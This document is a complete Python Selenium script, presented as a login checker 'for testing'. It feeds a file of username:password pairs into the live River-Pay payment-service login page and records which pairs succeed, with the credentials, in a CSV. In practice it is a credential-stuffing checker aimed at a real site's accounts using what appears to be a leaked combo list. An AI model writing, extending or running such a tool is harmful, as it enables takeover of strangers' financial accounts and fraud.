#!/usr/bin/env python3
"""
Simple Selenium-based login checker for River-Pay (for testing)
Reads an input text file with lines in `user:pass` format and attempts login to the provided URL.
Saves results to a CSV file with columns: username,password,status,message

Defaults (can be overridden with CLI args):
 - URL: https://river-pay.com/office/login
 - user xpath: //*[@id="LoginForm_login"]
 - pass xpath: //*[@id="LoginForm_password"]

Detection heuristic:
 - If the page URL changes after submit -> success
 - If xpath elements for login still present -> failure
 - Otherwise assume success if login form no longer present

Note: This script uses Selenium and requires Chrome/Chromium and matching chromedriver to be installed.
"""

import argparse
import csv
import os
import time
from pathlib import Path

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
try:
    # webdriver-manager is optional; only import if available
    from webdriver_manager.chrome import ChromeDriverManager
    WEBDRIVER_MANAGER_AVAILABLE = True
except Exception:
    WEBDRIVER_MANAGER_AVAILABLE = False


def attempt_login(driver, url, user_selector, pass_selector, logout_selectors, username, password, wait_after=3):
    try:
        driver.get(url)
    except WebDriverException as e:
        return False, f"navigation error: {e}"

    time.sleep(1)
    try:
        u_el = driver.find_element(By.CSS_SELECTOR, user_selector)
        p_el = driver.find_element(By.CSS_SELECTOR, pass_selector)
    except NoSuchElementException as e:
        return False, f"login fields not found: {e}"

    try:
        u_el.clear()
        u_el.send_keys(username)
        p_el.clear()
        p_el.send_keys(password)
        # Submit by pressing ENTER on password field
        p_el.send_keys(Keys.ENTER)
    except Exception as e:
        return False, f"input/sendkeys error: {e}"

    # wait for response
    time.sleep(wait_after)

    # Heuristics for success
    current_url = driver.current_url
    if current_url and (current_url.rstrip('/') != url.rstrip('/')):
        return True, f"URL changed -> {current_url}"

    # Check for known logout/dashboard selectors as a sign of successful login
    for sel in logout_selectors:
        try:
            if driver.find_elements(By.CSS_SELECTOR, sel):
                return True, f"logout/dashboard selector present: {sel}"
        except Exception:
            # ignore invalid selectors
            pass

    # if login form still present, likely failed
    try:
        driver.find_element(By.CSS_SELECTOR, user_selector)
        # still present
        return False, "login form still present after submit"
    except NoSuchElementException:
        # form not found -> likely logged in or page changed dynamic
        return True, "login form gone after submit"


def make_driver(headless=True, window_size=(1200, 900), auto_install=False):
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless=new")
    chrome_options.add_argument(f"--window-size={window_size[0]},{window_size[1]}")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    # optional: disable images to speed up
    prefs = {"profile.managed_default_content_settings.images": 2}
    chrome_options.add_experimental_option("prefs", prefs)

    if auto_install:
        if not WEBDRIVER_MANAGER_AVAILABLE:
            raise RuntimeError("webdriver-manager not available; install webdriver-manager or remove --auto-driver")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
    else:
        driver = webdriver.Chrome(options=chrome_options)
    return driver


def parse_input_file(path):
    pairs = []
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            user = user.strip()
            pwd = pwd.strip()
            if not user:
                continue
            pairs.append((user, pwd))
    return pairs


def main():
    parser = argparse.ArgumentParser(description="Check logins against River-Pay login page using Selenium.")
    parser.add_argument("--input", "-i", default="/workspaces/River-PayCheckr/river-pay(1).txt", help="Input file (user:pass per line)")
    parser.add_argument("--output", "-o", default="/workspaces/River-PayCheckr/login_results.csv", help="CSV output file")
    parser.add_argument("--url", default="https://river-pay.com/office/login", help="Login page URL")
    parser.add_argument("--user-selector", default='#LoginForm_login', help="CSS selector for user field")
    parser.add_argument("--pass-selector", default='#LoginForm_password', help="CSS selector for password field")
    parser.add_argument("--logout-selector", dest='logout_selectors', action='append', help="CSS selector that indicates a logged-in state (can be repeated)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--wait", type=float, default=3.0, help="Seconds to wait after submit before checking")
    parser.add_argument("--screenshots", action="store_true", help="Save screenshots for failures into ./screenshots/")
    parser.add_argument("--auto-driver", action="store_true", help="Auto-install chromedriver via webdriver-manager")

    args = parser.parse_args()

    inp = Path(args.input)
    if not inp.exists():
        print(f"Input file not found: {inp}")
        return

    pairs = parse_input_file(inp)
    print(f"Loaded {len(pairs)} username/password pairs from {inp}")

    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    screenshots_dir = Path.cwd() / "screenshots"
    if args.screenshots:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

    driver = None
    try:
        driver = make_driver(headless=args.headless, auto_install=args.auto_driver)
    except Exception as e:
        print(f"Failed to start Chrome webdriver: {e}")
        return

    with open(output_path, "w", newline='', encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["username", "password", "status", "message"])

        # prepare logout selectors
        logout_selectors = args.logout_selectors or [
            ".nav-list > li:nth-child(14) > a:nth-child(1)",
            ".dropdown-menu > li:nth-child(2) > a:nth-child(1)",
        ]

        for (username, password) in pairs:
            print(f"Attempting: {username}")
            try:
                ok, msg = attempt_login(driver, args.url, args.user_selector, args.pass_selector, logout_selectors, username, password, wait_after=args.wait)
            except Exception as e:
                ok = False
                msg = f"exception during attempt: {e}"

            status = "SUCCESS" if ok else "FAIL"
            writer.writerow([username, password, status, msg])
            csvfile.flush()

            if (not ok) and args.screenshots:
                safe_name = username.replace('/', '_').replace('\\', '_')
                fn = screenshots_dir / f"{safe_name}.png"
                try:
                    driver.save_screenshot(str(fn))
                except Exception:
                    pass

    print(f"Results saved to {output_path}")

    try:
        driver.quit()
    except Exception:
        pass


if __name__ == '__main__':
    main()
